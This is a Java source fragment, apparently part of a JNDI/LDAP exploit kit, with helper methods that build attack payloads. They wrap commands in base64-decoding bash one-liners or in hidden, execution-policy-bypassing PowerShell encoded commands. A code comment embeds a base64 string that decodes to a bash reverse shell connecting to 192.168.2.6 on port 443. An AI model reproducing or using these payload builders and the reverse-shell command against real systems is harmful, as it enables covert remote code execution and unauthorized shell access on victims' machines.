...
public class Utilities {
    ...
    public static String getBase64CommandTpl(String command) {
        return "bash -c {echo," + Base64.getEncoder().encodeToString(command.getBytes()) + "}|{base64,-d}|{bash,-i}";
    }

    /**
     * Get parameter values from the baseDN ldap string and pass them to the function. Command MUST be a base64 string
     * String commandParam = getDnParam("o=tomcat,pwshb64cmd=YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQ==","pwshb64cmd");
     * e.g. createB64Payload("pwsh", commandParam) returns "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc pwshb64cmd=YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQ=="
     */
    public static String createB64Payload(String scriptLang, String command) {
        if(scriptLang.equals("pwsh")){
            return "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + command;
        } else {
            return "bash -c {echo," + command + "}|{base64,-d}|{bash,-i}";
        }
    }

    /**
     * Converts bytes to hex string
     * Borrowed from: https://github.com/pimps/JNDI-Exploit-Kit/blob/master/src/main/java/jndi/LDAPRefServer.java#L115
     */
